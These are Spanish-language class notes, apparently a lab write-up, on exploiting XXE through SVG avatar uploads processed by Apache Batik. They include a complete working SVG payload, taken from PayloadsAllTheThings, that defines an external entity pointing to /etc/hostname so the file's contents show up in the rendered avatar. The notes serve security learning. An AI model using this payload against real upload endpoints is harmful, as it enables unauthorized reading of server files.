En esta clase seguimos explorando vectores de ataque XXE, esta vez aprovechando la funcionalidad de subida de imágenes del laboratorio. El servidor permite a los usuarios subir avatares en formato SVG, los cuales son procesados con la librería Apache Batik. Esta librería interpreta entidades definidas dentro del SVG, lo que abre la puerta a un ataque XXE clásico.

Creamos un archivo SVG en el que definimos una entidad que apunta al archivo del sistema que contiene el nombre del host. Luego, insertamos esa entidad como contenido textual del SVG. Al subir la imagen como avatar en un comentario, el servidor procesa el archivo y renderiza el contenido de esa entidad, mostrando así el nombre del host en el propio avatar. Esta información es la que se necesita para resolver el laboratorio

-----

En payloadallthethings, podemos buscar por la subida de imagenes, en este caso:

#### XXE Inside SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

```

Se guarda en un archivo image.svg y se sube al servidor

